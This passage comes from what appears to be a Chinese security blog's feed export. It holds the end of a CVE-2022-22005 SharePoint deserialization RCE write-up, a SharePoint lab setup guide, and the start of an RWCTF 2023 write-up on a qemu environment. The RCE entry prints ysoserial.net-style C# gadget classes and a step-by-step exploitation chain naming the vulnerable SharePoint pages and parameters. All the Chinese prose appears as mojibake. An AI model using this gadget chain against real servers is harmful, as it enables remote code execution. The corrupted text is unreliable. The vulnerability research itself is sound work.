class="hljs-title">DataSetMarshal</span><span class="hljs-params">(object fakeTable)</span>:<span class="hljs-title">this</span><span class="hljs-params">(fakeTable, new InputArgs()</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-comment">// This won&#x27;t use anything we might have defined in ysoserial.net BinaryFormatter process (such as minification)</span>    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">DataSetMarshal</span><span class="hljs-params">(object fakeTable, InputArgs inputArgs)</span></span><span class="hljs-function">    </span>&#123;        MemoryStream stm = <span class="hljs-keyword">new</span> MemoryStream();        <span class="hljs-keyword">if</span> (inputArgs.Minify)        &#123;            ysoserial.Helpers.ModifiedVulnerableBinaryFormatters.BinaryFormatter fmtLocal = <span class="hljs-keyword">new</span> ysoserial.Helpers.ModifiedVulnerableBinaryFormatters.BinaryFormatter();            fmtLocal.Serialize(stm, fakeTable);        &#125;        <span class="hljs-keyword">else</span>        &#123;            BinaryFormatter fmt = <span class="hljs-keyword">new</span> BinaryFormatter();            fmt.Serialize(stm, fakeTable);        &#125;        SetFakeTable(stm.ToArray());    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">DataSetMarshal</span><span class="hljs-params">(MemoryStream ms)</span></span><span class="hljs-function">    </span>&#123;        SetFakeTable(ms.ToArray());    &#125;&#125;public class DataSetGenerator:GenericGenerator&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> override object <span class="hljs-title">Generate</span><span class="hljs-params">(string formatter, InputArgs inputArgs)</span></span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">byte</span>[] init_payload = (<span class="hljs-keyword">byte</span>[]) <span class="hljs-keyword">new</span> TextFormattingRunPropertiesGenerator().GenerateWithNoTest(<span class="hljs-string">&quot;BinaryFormatter&quot;</span>, inputArgs);        DataSetMarshal payloadDataSetMarshal = <span class="hljs-keyword">new</span> DataSetMarshal(init_payload);        <span class="hljs-keyword">if</span> (formatter.Equals(<span class="hljs-string">&quot;binaryformatter&quot;</span>, StringComparison.OrdinalIgnoreCase)            || formatter.Equals(<span class="hljs-string">&quot;losformatter&quot;</span>, StringComparison.OrdinalIgnoreCase)            || formatter.Equals(<span class="hljs-string">&quot;soapformatter&quot;</span>, StringComparison.OrdinalIgnoreCase))        &#123;             <span class="hljs-keyword">return</span> Serialize(payloadDataSetMarshal, formatter, inputArgs);        &#125;        <span class="hljs-keyword">else</span>        &#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> Exception(<span class="hljs-string">&quot;Formatter not supported&quot;</span>);        &#125;    &#125;&#125;</code></pre><pre><code class="hljs java">[Serializable]public class TextFormattingRunPropertiesMarshal : ISerializable&#123;    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-title">TextFormattingRunPropertiesMarshal</span><span class="hljs-params">(SerializationInfo info, StreamingContext context)</span></span><span class="hljs-function">    </span>&#123;    &#125;    string _xaml;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">GetObjectData</span><span class="hljs-params">(SerializationInfo info, StreamingContext context)</span></span><span class="hljs-function">    </span>&#123;        Type typeTFRP = typeof(TextFormattingRunProperties);        info.SetType(typeTFRP);        info.AddValue(<span class="hljs-string">&quot;ForegroundBrush&quot;</span>, _xaml);                &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TextFormattingRunPropertiesMarshal</span><span class="hljs-params">(string xaml)</span></span><span class="hljs-function">    </span>&#123;        _xaml = xaml;    &#125;&#125;</code></pre><p>æˆ‘ä¸ªäººè°ƒè¯•çš„æ—¶å€™çš„ç†è§£æ˜¯ï¼Œå¯¹äº<code>DataSet</code>ä¸­ä¸€äº›å±æ€§è¿›è¡Œè®¾ç½®äº†å€¼ï¼Œæ¯”å¦‚<code>DataSet.RemotingFormat</code>å¿…é¡»è¦è®¾ç½®ä¸º<code>System.Data.SerializationFormat.Binary</code>ï¼Œ<code>DataSet.Tables.Count</code>è®¾ç½®ä¸º<code>1</code>ï¼Œ<code>DataSet.Tables_0</code>è®¾ç½®ä¸º<code>_fakeTable</code>ï¼Œå…¶ä»–å€¼çš„è®¾ç½®æ˜¯ä¸ºäº†èƒ½é¡ºåˆ©èµ°åˆ°<code>remotingFormat</code>çš„<code>Deserialize()</code>ä½ç½®</p><p><img src="/img/CVE-2022-22005/remotingFormat.png" alt="remotingFormat"></p><p>æœ€ååœ¨ååºåˆ—çš„æ—¶å€™ï¼Œä¸­é—´åµŒå¥—ä¸€ä¸ª<code>xml</code>ï¼Œç„¶ååœ¨<code>Parse</code>å’Œ<code>Load</code>çš„è¿‡ç¨‹ä¸­ç›´æ¥è§¦å‘<code>RCE</code></p><p><img src="/img/CVE-2022-22005/TextFormattingRunProperties.png" alt="TextFormattingRunProperties"></p><p><img src="/img/CVE-2022-22005/XamlReader-Load.png" alt="XamlReader-Load"></p><p>ä½†æ˜¯åœ¨è°ƒè¯•çš„æ—¶å€™ï¼Œä¼šå‘ç°ï¼Œæ€ä¹ˆæ ·éƒ½ä¸èƒ½è¿‡å»<code>EventTrace.EasyTraceEvent</code>è¿™å¥</p><p><img src="/img/CVE-2022-22005/EventTrace.png" alt="EventTrace"></p><p>ç„¶åå¯ä»¥å‘ç°å…¶å¼‚å¸¸çš„åŸå› å¦‚ä¸‹ï¼Œå…¶å¯¹åº”çš„è‹±æ–‡ä¸º<code>The type initializer for &#39;MS.Utility.EventTrace&#39; threw an exception.</code></p><p><img src="/img/CVE-2022-22005/MS-Utility-EventTrace.png"></p><p>æœ€ååœ¨çŠ„è§’æ—®æ—¯çš„ä¸Šè¿°åˆ—ä¸¾çš„åšå®¢ä¸­æ‰¾åˆ°ï¼Œè¿™ä¸ªè¿›ç¨‹ä¸èƒ½è®¿é—®æŸæ³¨å†Œè¡¨ï¼Œå› ä¸ºè¿™ä¸ª<code>IIS</code>æœåŠ¡å™¨æ˜¯æ¨¡æ‹Ÿç€<code>IUSR</code>è´¦æˆ·çš„æƒé™çš„</p><pre><code class="hljs oxygene">You cannot use the XamlReader.Load <span class="hljs-keyword">static</span> <span class="hljs-function"><span class="hljs-keyword">method</span> <span class="hljs-title">because</span> <span class="hljs-title">the</span> <span class="hljs-title">IIS</span> <span class="hljs-title">webserver</span> <span class="hljs-title">is</span> <span class="hljs-title">impersonating</span> <span class="hljs-title">as</span> <span class="hljs-title">the</span> <span class="hljs-title">IUSR</span> <span class="hljs-title">account</span> <span class="hljs-title">and</span> <span class="hljs-title">that</span> <span class="hljs-title">account</span> <span class="hljs-title">has</span> <span class="hljs-title">limited</span> <span class="hljs-title">access</span> <span class="hljs-title">to</span> <span class="hljs-title">the</span> <span class="hljs-title">registry</span>.</span></code></pre><p>æ‰€ä»¥ä¸èƒ½ä½¿ç”¨ä»»ä½•åŒ…å«<code>XamlReader.Load</code>POPé“¾çš„<code>Gadget</code>ï¼Œå› æ­¤æˆ‘é€‰æ‹©ä½¿ç”¨<code>TypeConfuseDelegate</code>æœ€åå¯ä»¥æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨</p><p>æ³¨ï¼šè¿™é‡Œä¸ç¡®å®šä¼šä¸ä¼šå­˜åœ¨<code>cmd</code>ç”Ÿæˆå’Œ<code>powershell</code>ç”Ÿæˆä¸ä¸€è‡´ä»¥åŠ<code>.NET Framework</code>ç‰ˆæœ¬è·Ÿæ‰“çš„ç‰ˆæœ¬ä¸ä¸€è‡´çš„é—®é¢˜ï¼Œæˆ‘æœ€åæ˜¯ç”¨<code>cmd</code>ç”Ÿæˆçš„</p><h2 id="ç»¼ä¸Š"><a href="#ç»¼ä¸Š" class="headerlink" title="ç»¼ä¸Š"></a>ç»¼ä¸Š</h2><p>æ•´ä½“çš„æ¼æ´åˆ©ç”¨æµç¨‹</p><ol><li>åˆ©ç”¨<code>InfoPath</code>ç»™<code>SharePoint Server</code>ä¼ä¸šç‰ˆåˆ›å»ºä¸€ä¸ª<code>SharePoint List</code></li><li>åœ¨<code>SharePoint List</code>ä¸­æ–°å»ºï¼Œå¹¶ä¸Šä¼ å¯ä»¥å¯¼è‡´ååºåˆ—åˆ©ç”¨çš„æ–‡ä»¶ï¼Œå¹¶é©»ç•™åœ¨è¯¥é¡µé¢ï¼Œä»¥ä¼šè¯çš„å½¢å¼ä¿å­˜æ•°æ®åº“ä¸­</li><li>åˆ©ç”¨<code>newifs.aspx</code>è¯·æ±‚å¾—åˆ°çš„<code>_InfoPath_CanaryValue</code>å’Œ<code>Document</code>çš„<code>editingSessionId</code>ç»™<code>formserverattachments.aspx</code>å‘é€è¯·æ±‚ï¼Œå‡è£…ä¸‹è½½æ–‡ä»¶ï¼Œå®åˆ™è·å–ä¼šè¯ä¸­çš„å¯ä»¥å¯¼è‡´ååºåˆ—åˆ©ç”¨çš„æ–‡ä»¶å¯¹åº”çš„<code>StateKey</code></li><li>å°†è¯¥<code>StateKey</code>ä¼ å…¥å¯ä»¥è¢«æ”»å‡»çš„<code>aspx</code>ä¸­ï¼ŒCVE-2022-22005æ˜¯ç”¨çš„<code>ChartPreviewImage.aspx</code>ï¼Œå…¶å‚æ•°ä¸º<code>sk</code>ï¼›CVE-2022-29108ä¹Ÿç”¨çš„æ˜¯<code>ChartPreviewImage.aspx</code>ï¼Œå…¶å‚æ•°ä¸º<code>pk</code>ï¼Œ<code>ot</code>ï¼Œ<code>ok</code>ï¼Œ<code>csk</code>ï¼ˆ<code>pk</code>ä¸ºå…¶<code>DBguid_</code>ï¼Œ<code>ot</code>ä¸º<code>chart</code>ï¼Œ<code>ok</code>ä¸º<code>Fileguid</code>ï¼Œ<code>csk</code>ä¸<code>sk</code>ä¸€è‡´ï¼‰</li></ol><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><blockquote><p><a href="https://www.zerodayinitiative.com/blog/2021/3/17/cve-2021-27076-a-replay-style-deserialization-attack-against-sharepoint">https://www.zerodayinitiative.com/blog/2021/3/17/cve-2021-27076-a-replay-style-deserialization-attack-against-sharepoint</a><br><a href="https://hnd3884.github.io/posts/cve-2022-22005-microsoft-sharepoint-RCE">https://hnd3884.github.io/posts/cve-2022-22005-microsoft-sharepoint-RCE</a><br><a href="https://www.starlabs.sg/blog/2022/05-new-wine-in-old-bottle-microsoft-sharepoint-post-auth-deserialization-rce-cve-2022-29108/">https://www.starlabs.sg/blog/2022/05-new-wine-in-old-bottle-microsoft-sharepoint-post-auth-deserialization-rce-cve-2022-29108/</a><br><a href="https://xz.aliyun.com/t/9593">https://xz.aliyun.com/t/9593</a><br><a href="https://srcincite.io/blog/2020/07/20/sharepoint-and-pwn-remote-code-execution-against-sharepoint-server-abusing-dataset.html">https://srcincite.io/blog/2020/07/20/sharepoint-and-pwn-remote-code-execution-against-sharepoint-server-abusing-dataset.html</a><br><a href="https://mp.weixin.qq.com/s/2IbSrLcjiqo1a6RF9-v3Yg">https://mp.weixin.qq.com/s/2IbSrLcjiqo1a6RF9-v3Yg</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SharePoint</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SharePoint ç¯å¢ƒæ­å»º</title>
    <link href="/2023/03/21/SharePoint%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2023/03/21/SharePoint%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="æ€»æµç¨‹"><a href="#æ€»æµç¨‹" class="headerlink" title="æ€»æµç¨‹"></a>æ€»æµç¨‹</h2><ol><li>å®‰è£… Windows Server 2019 </li><li>ä¿®æ”¹æœåŠ¡å™¨åå­—</li><li>è®¾ç½®æ–°æ—ï¼ŒåŸŸ</li><li>å®‰è£… Windows Sql Server</li><li>å®‰è£… SharePoint Server 2019</li><li>é…ç½® SharePoint Server 2019</li><li>æ·»åŠ æ–°ç”¨æˆ·</li><li>æ–°å»ºç½‘ç«™é›†ï¼Œå¹¶ç»™ç½‘ç«™é›†æ·»åŠ ç®¡ç†å‘˜ç”¨æˆ·</li></ol><h2 id="å®‰è£…-Windows-Server-2019"><a href="#å®‰è£…-Windows-Server-2019" class="headerlink" title="å®‰è£… Windows Server 2019"></a>å®‰è£… Windows Server 2019</h2><p>æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œå°±ç›´æ¥ä¸‹è½½<code>Windows Server 2019</code>çš„é•œåƒï¼Œå®‰è£…å°±è¡Œäº†ï¼ˆæˆ‘ä¹Ÿä¸æ¸…æ¥š<code>Standard</code>ã€<code>Datacenter</code>ã€<code>Essentials</code>çš„åŒºåˆ«ï¼Œæˆ‘åæ­£å®‰è£…çš„æ˜¯<code>Standard</code>ï¼‰</p><p>æ³¨æ„é€‰æ‹©å¸¦æ¡Œé¢æ¨¡å¼çš„ï¼Œå¦åˆ™åº”è¯¥æ²¡å›¾å½¢åŒ–ç•Œé¢</p><h2 id="ä¿®æ”¹æœåŠ¡å™¨åå­—"><a href="#ä¿®æ”¹æœåŠ¡å™¨åå­—" class="headerlink" title="ä¿®æ”¹æœåŠ¡å™¨åå­—"></a>ä¿®æ”¹æœåŠ¡å™¨åå­—</h2><p><img src="/img/SharePoint-Setup/SP2019.png" alt="SP2019"></p><p>ä¿®æ”¹è®¡ç®—æœºåå­—ï¼Œä¾¿äºå±€åŸŸç½‘è®¿é—®è¯¥æœåŠ¡å™¨</p><h2 id="è®¾ç½®æ–°æ—ï¼ŒåŸŸ"><a href="#è®¾ç½®æ–°æ—ï¼ŒåŸŸ" class="headerlink" title="è®¾ç½®æ–°æ—ï¼ŒåŸŸ"></a>è®¾ç½®æ–°æ—ï¼ŒåŸŸ</h2><h3 id="æ·»åŠ è§’è‰²å’ŒåŠŸèƒ½"><a href="#æ·»åŠ è§’è‰²å’ŒåŠŸèƒ½" class="headerlink" title="æ·»åŠ è§’è‰²å’ŒåŠŸèƒ½"></a>æ·»åŠ è§’è‰²å’ŒåŠŸèƒ½</h3><p>ç‚¹å‡»ä»ªè¡¨ç›˜-æ·»åŠ è§’è‰²å’ŒåŠŸèƒ½ã€å®‰è£…ç±»å‹ï¼ˆé€‰é»˜è®¤ï¼ŒåŸºäºè§’è‰²æˆ–åŸºäºåŠŸèƒ½çš„å®‰è£…ï¼‰ã€æœåŠ¡å™¨é€‰æ‹©ï¼ˆé€‰é»˜è®¤ï¼Œä»æœåŠ¡å™¨æ± ä¸­é€‰æ‹©æœåŠ¡å™¨ï¼Œé€‰æ‹©æœ¬æœºï¼‰ã€æœåŠ¡å™¨è§’è‰²ï¼ˆå‹¾é€‰<code>Active Directory åŸŸæœåŠ¡</code>ï¼‰ã€åŠŸèƒ½ï¼ˆå‹¾é€‰<code>.NET Framework 3.5 åŠŸèƒ½</code>ï¼‰ã€<code>AD DS</code>ï¼ˆç‚¹ä¸‹ä¸€æ­¥ï¼‰ã€ç¡®è®¤ï¼ˆç‚¹å®‰è£…ï¼‰</p><p><img src="/img/SharePoint-Setup/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%92%E8%89%B2.png" alt="æœåŠ¡å™¨è§’è‰²"></p><p><img src="/img/SharePoint-Setup/%E5%8A%9F%E8%83%BD.png" alt="åŠŸèƒ½"></p><h3 id="æå‡ä¸ºåŸŸæ§åˆ¶å™¨"><a href="#æå‡ä¸ºåŸŸæ§åˆ¶å™¨" class="headerlink" title="æå‡ä¸ºåŸŸæ§åˆ¶å™¨"></a>æå‡ä¸ºåŸŸæ§åˆ¶å™¨</h3><p>å°†æ­¤æœåŠ¡å™¨æå‡ä¸ºåŸŸæ§åˆ¶å™¨</p><p><img src="/img/SharePoint-Setup/%E6%8F%90%E5%8D%87%E4%B8%BA%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8.png" alt="æå‡ä¸ºåŸŸæ§åˆ¶å™¨"></p><ul><li>éƒ¨ç½²é…ç½®ï¼ˆæ·»åŠ æ–°æ—ï¼Œè®¾ç½®æ ¹åŸŸåï¼‰</li></ul><p><img src="/img/SharePoint-Setup/%E9%83%A8%E7%BD%B2%E9%85%8D%E7%BD%AE.png" alt="éƒ¨ç½²é…ç½®"></p><ul><li>åŸŸæ§åˆ¶å™¨é€‰é¡¹ï¼ˆé»˜è®¤ï¼Œ<code>Windows Server 2016</code>ï¼Œè®¾ç½®å¯†ç ï¼›DNS é€‰é¡¹ï¼Œé»˜è®¤ï¼Œä¸ç”¨å‹¾é€‰ï¼Œç›´æ¥ä¸‹ä¸€æ­¥ï¼‰</li></ul><p><img src="/img/SharePoint-Setup/DNS%E9%80%89%E9%A1%B9.png" alt="DNSé€‰é¡¹"></p><ul><li>å…¶ä»–é€‰é¡¹ï¼ˆè®¾ç½®<code>NetBIOS</code>åŸŸåï¼‰</li></ul><p><img src="/img/SharePoint-Setup/%E5%85%B6%E4%BB%96%E9%80%89%E9%A1%B9.png" alt="å…¶ä»–é€‰é¡¹"></p><p>è·¯å¾„ã€æŸ¥çœ‹é€‰é¡¹ã€å…ˆå†³æ¡ä»¶æ£€æŸ¥ã€å®‰è£…ã€ç»“æœ</p><p>å®‰è£…å®Œæ¯•å°±ä¼šé‡å¯</p><h2 id="å®‰è£…-Windows-Sql-Server"><a href="#å®‰è£…-Windows-Sql-Server" class="headerlink" title="å®‰è£… Windows Sql Server"></a>å®‰è£… Windows Sql Server</h2><p>æˆ‘æ˜¯å®‰è£…äº†ä¸€ä¸ª<code>SQLServer2016SP2-FullSlipstream-x64-CHS.iso</code>çš„<code>Windows Sql</code>ï¼ˆä¹Ÿæ²¡æ¿€æ´»ï¼‰ï¼Œç›´æ¥åŒå‡»<code>iso</code>è¿›è¡Œå®‰è£…</p><p>åœ¨<code>å®‰è£…</code>ä¸­é€‰æ‹©<code>å…¨æ–° SQL Server ç‹¬ç«‹å®‰è£…æˆ–å‘ç°æœ‰å®‰è£…æ·»åŠ åŠŸèƒ½</code>è¿›è¡Œå®‰è£…</p><ul><li>åŠŸèƒ½é€‰æ‹©ï¼šéœ€è¦å‹¾é€‰ï¼Œå› ä¸ºæˆ‘åªç”¨æ­å»º<code>SharePoint</code>ç¯å¢ƒï¼Œå› æ­¤æˆ‘åªå‹¾é€‰äº†æ•°æ®åº“å¼•æ“æœåŠ¡</li></ul><p><img src="/img/SharePoint-Setup/%E5%8A%9F%E8%83%BD%E9%80%89%E6%8B%A9.png" alt="åŠŸèƒ½é€‰æ‹©"></p><ul><li>æ•°æ®åº“å¼•æ“é…ç½®ï¼šéœ€è¦æ·»åŠ å½“å‰ç”¨æˆ·</li></ul><p><img src="/img/SharePoint-Setup/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%BC%95%E6%93%8E%E9%85%8D%E7%BD%AE.png" alt="æ•°æ®åº“å¼•æ“é…ç½®"></p><p><code>SQL Server 2016</code>å®‰è£…æˆåŠŸ</p><p><img src="/img/SharePoint-Setup/SQL-Server-2016.png" alt="SQL-Server-2016"></p><h2 id="å®‰è£…-SharePoint-Server-2019"><a href="#å®‰è£…-SharePoint-Server-2019" class="headerlink" title="å®‰è£… SharePoint Server 2019"></a>å®‰è£… SharePoint Server 2019</h2><p>ä¸‹è½½é•œåƒï¼ŒåŒå‡»<code>iso</code>ï¼Œé€šè¿‡<code>splash.hta</code>è¿›è¡Œå®‰è£…</p><p><img src="/img/SharePoint-Setup/splash-hta.png" alt="splash.hta"></p><p>å…ˆ<code>å®‰è£…å¿…å¤‡è½¯ä»¶</code>ï¼ˆå®‰è£…ä¹‹å‰ï¼Œéœ€è¦å°†<code>Windows Server</code>æ›´æ–°åˆ°æœ€æ–°ç‰ˆï¼‰ï¼Œå†<code>å®‰è£… SharePoint Server</code></p><p>è¿™ä¸ªè¿‡ç¨‹å¾ˆç®€å•ï¼Œè¿è¡Œå³å¯</p><h2 id="é…ç½®-SharePoint-Server-2019"><a href="#é…ç½®-SharePoint-Server-2019" class="headerlink" title="é…ç½® SharePoint Server 2019"></a>é…ç½® SharePoint Server 2019</h2><ul><li><p>è¿æ¥åˆ°æœåŠ¡å™¨åœºï¼ˆé€‰æ‹©<code>åˆ›å»ºæ–°çš„æœåŠ¡å™¨åœº</code>ï¼‰</p></li><li><p>æŒ‡å®šé…ç½®æ•°æ®åº“è®¾ç½®æ—¶ï¼ˆ<strong>æ³¨æ„</strong>è¿™é‡Œå°±ç®—æ˜¯æ•°æ®åº“æœåŠ¡å™¨å’Œå½“å‰æœåŠ¡å™¨åœ¨ä¸€ä¸ªæœºå™¨ä¸Šï¼Œä¹Ÿè¦å†™å…·ä½“çš„<code>ip</code>ï¼Œè€Œä¸æ˜¯<code>127.0.0.1</code>ï¼‰</p></li></ul><p><img src="/img/SharePoint-Setup/%E6%8C%87%E5%AE%9A%E9%85%8D%E7%BD%AE%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E7%BD%AE.png" alt="æŒ‡å®šé…ç½®æ•°æ®åº“è®¾ç½®"></p><ul><li><p>æŒ‡å®šæœåŠ¡å™¨è§’è‰²ï¼ˆæˆ‘ä¸ªäººé…ç½®é€‰æ‹©çš„æ˜¯<code>è‡ªå®šä¹‰</code>ï¼Œä¹Ÿè¦çœ‹åˆ°åˆ«äººé€‰æ‹©<code>å•ä¸€æœåŠ¡å™¨åœº</code>ï¼Œå…·ä½“åŒºåˆ«ä¸æ‡‚ï¼‰</p></li><li><p>SharePointäº§å“é…ç½®å‘å¯¼</p></li></ul><p><img src="/img/SharePoint-Setup/SharePoint%E4%BA%A7%E5%93%81%E9%85%8D%E7%BD%AE%E5%90%91%E5%AF%BC.png" alt="SharePointäº§å“é…ç½®å‘å¯¼"></p><p>ç­‰é…ç½®ç»“æŸå³å¯</p><h2 id="æ·»åŠ æ–°ç”¨æˆ·"><a href="#æ·»åŠ æ–°ç”¨æˆ·" class="headerlink" title="æ·»åŠ æ–°ç”¨æˆ·"></a>æ·»åŠ æ–°ç”¨æˆ·</h2><p>æœåŠ¡å™¨ç®¡ç†å™¨-ä»ªè¡¨ç›˜-å·¥å…·-<code>Active Directoryç”¨æˆ·å’Œè®¡ç®—æœº</code></p><p>æˆ‘ä¸ªäººé…ç½®ï¼Œæ˜¯å¯¹äºåˆ›å»ºä¸€ä¸ªç»„ç»‡å•ä½ï¼Œåœ¨ç»„ç»‡å•ä½ä¸­åˆ›å»ºç”¨æˆ·ï¼Œå½“ç„¶å¯ä»¥ç›´æ¥åˆ›å»ºç”¨æˆ·</p><p><img src="/img/SharePoint-Setup/%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7.png" alt="æ·»åŠ ç”¨æˆ·"></p><p><strong>æ³¨æ„</strong>è¿™é‡Œç”¨æˆ·ç™»å½•åæ˜¯ <code>liubei@sp.com.cn</code> ï¼Œä¹‹åç™»å½•æ—¶éœ€è¦å¸¦<code>@sp.com.cn</code></p><p><img src="/img/SharePoint-Setup/%E6%96%B0%E5%BB%BA%E7%94%A8%E6%88%B7.png" alt="æ–°å»ºç”¨æˆ·"></p><p><strong>æ³¨æ„</strong>è¿™é‡Œè®¾ç½®å¯†ç æ—¶ï¼ŒæŠŠé»˜è®¤çš„ç”¨æˆ·ä¸‹æ¬¡ç™»é™†æ—¶é¡»æ›´æ”¹å¯†ç å»æ‰ï¼Œå¦åˆ™å¾—å†ç™»å½•ä¸€æ¬¡æœºå™¨ï¼Œæ‰èƒ½ç™»å½•åˆ°å…¶æœ‰æƒé™æŸ¥çœ‹æˆ–ç®¡ç†çš„ç½‘ç«™é›†ï¼ˆè¿™é‡Œå¡äº†æˆ‘å¥½ä¹…ï¼Œå½“æ—¶æ­»æ´»ç™»å½•ä¸ä¸Šå»ï¼‰</p><p><img src="/img/SharePoint-Setup/%E7%94%A8%E6%88%B7%E8%AE%BE%E7%BD%AE%E5%AF%86%E7%A0%81.png" alt="ç”¨æˆ·è®¾ç½®å¯†ç "></p><h2 id="æ–°å»ºç½‘ç«™é›†"><a href="#æ–°å»ºç½‘ç«™é›†" class="headerlink" title="æ–°å»ºç½‘ç«™é›†"></a>æ–°å»ºç½‘ç«™é›†</h2><p>ä¹‹å‰å‡†å¤‡å·¥ä½œå…¨éƒ¨åšå®Œä¹‹åï¼Œå¯ä»¥é€šè¿‡æ‰“å¼€<code>SharePoint 2019ç®¡ç†ä¸­å¿ƒ</code>è¿›è¡Œç®¡ç†</p><p><img src="/img/SharePoint-Setup/SP2019-4321.png" alt="SP2019:4321"></p><p>å…ˆé€šè¿‡<code>ç®¡ç†Webåº”ç”¨ç¨‹åº</code>æ–°å»ºä¸€ä¸ªWebåº”ç”¨ç¨‹åºï¼Œç›´æ¥ç”¨é»˜è®¤çš„å³å¯</p><p><img src="/img/SharePoint-Setup/web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%AE%A1%E7%90%86.png" alt="webåº”ç”¨ç¨‹åºç®¡ç†"></p><p>å†åˆ›å»ºç½‘ç«™é›†ï¼Œæˆ‘è¿™é‡Œé€‰æ‹©çš„æ˜¯é¡¹ç›®ç½‘ç«™ï¼Œå…¶ä»–çš„å¹¶æœªå°è¯•è¿‡ï¼Œä¸‹é¢è®¾ç½®å…¶ä¸»ç®¡ç†å‘˜å’Œç¬¬äºŒç®¡ç†å‘˜</p><p><img src="/img/SharePoint-Setup/%E5%88%9B%E5%BB%BA%E7%BD%91%E7%AB%99%E9%9B%86.png" alt="åˆ›å»ºç½‘ç«™é›†"></p><p>ä½¿ç”¨ç®¡ç†å‘˜åˆ˜å¤‡è¿›è¡Œç™»å½•ï¼ˆ<strong>æ³¨æ„</strong>é¦–å…ˆä¸èƒ½é€‰æ‹©ç”¨æˆ·åˆæ¬¡ç™»å½•å°±è¦ä¿®æ”¹å¯†ç ï¼Œä¸”ç™»å½•æ—¶ç”¨æˆ·åéœ€è¦å¸¦<code>@sp.com.cn</code>ï¼Œè¿™ä¸ªæ—çš„åå­—ï¼‰</p><p><img src="/img/SharePoint-Setup/JiHan-LiuBei.png" alt="JiHan-LiuBei"></p><p>ç™»å½•æ•ˆæœå¦‚å›¾</p><p><img src="/img/SharePoint-Setup/%E5%AD%A3%E6%B1%89.png" alt="å­£æ±‰"></p><p>ç½‘ç«™é›†å¯ä»¥å…±äº«ç»™å…¶ä»–ç”¨æˆ·ï¼Œä¸”å¯ä»¥è®¾ç½®å…¶ä»–ç”¨æˆ·çš„æƒé™</p><p>è¿™ä¸ªç½‘ç«™é›†åœ¨å±€åŸŸç½‘å†…å‡å¯è®¿é—®</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><blockquote><p><a href="https://www.cnblogs.com/jianyus/p/9874010.html">https://www.cnblogs.com/jianyus/p/9874010.html</a><br><a href="https://www.jianshu.com/p/fb96bfcd3770">https://www.jianshu.com/p/fb96bfcd3770</a><br><a href="https://blog.51cto.com/u_13737725/3178938">https://blog.51cto.com/u_13737725/3178938</a><br><a href="https://blog.51cto.com/u_13737725/3178944">https://blog.51cto.com/u_13737725/3178944</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>setup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SharePoint</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RWCTF 2023 ShellFind</title>
    <link href="/2023/02/08/RWCTF%202023%20ShellFind/"/>
    <url>/2023/02/08/RWCTF%202023%20ShellFind/</url>
    
    <content type="html"><![CDATA[<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>è¿™é¢˜ä¸»è¦å½“æ—¶æ­å»ºç¯å¢ƒç”¨äº†å¾ˆå¤šæ—¶é—´ï¼Œå¯¼è‡´æœ€åæ²¡æ—¶é—´å†™<code>exp</code>ï¼Œåœ¨æ­¤è®°å½•ä¸€ä¸‹ç¯å¢ƒæ­å»ºçš„è¿‡ç¨‹</p><p>ä¸»è¦ç¯å¢ƒæ­å»ºè¿˜æ˜¯æœ‰ä¸‰ç§åŠæ³•ï¼š<code>qemu-system</code>èµ·<code>mips system</code>ç¯å¢ƒï¼›<code>qemu-user</code>èµ·å•ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼›<code>firmadyne</code>èµ·<code>mips system</code>ç¯å¢ƒ</p><h3 id="qemu-system"><a href="#qemu-system" class="headerlink" title="qemu-system"></a>qemu-system</h3><p>ä»<a href="https://people.debian.org/~aurel32/qemu/mips/">aurel32 mips</a>ä¸­ä¸‹è½½å¯¹åº”çš„<code>qemu</code>é•œåƒ</p><p>åœ¨èµ·ç³»ç»Ÿä¹‹å‰éœ€è¦å»ºç«‹<code>qemu</code>ç³»ç»Ÿå’Œå®¿ä¸»æœºä¹‹é—´çš„ç½‘ç»œæ¡¥æ¥</p><p>ä¾æ¬¡è¿è¡Œä»¥ä¸‹æŒ‡ä»¤</p><ol><li><code>sudo apt-get install bridge-utils uml-utilities</code></li><li><code>sudo gedit /etc/network/interfaces</code></li></ol><pre><code class="hljs properties"><span class="hljs-attr">auto</span> <span class="hljs-string">lo</span><span class="hljs-attr">iface</span> <span class="hljs-string">lo inet loopback</span><span class="hljs-attr">auto</span> <span class="hljs-string">ens33</span><span class="hljs-attr">iface</span> <span class="hljs-string">ens33 inet dhcp</span><span class="hljs-comment">#auto br0</span><span class="hljs-attr">iface</span> <span class="hljs-string">br0 inet dhcp</span>  <span class="hljs-attr">bridge_ports</span> <span class="hljs-string">ens33</span>  <span class="hljs-attr">bridge_maxwait</span> <span class="hljs-string">0</span></code></pre><ol 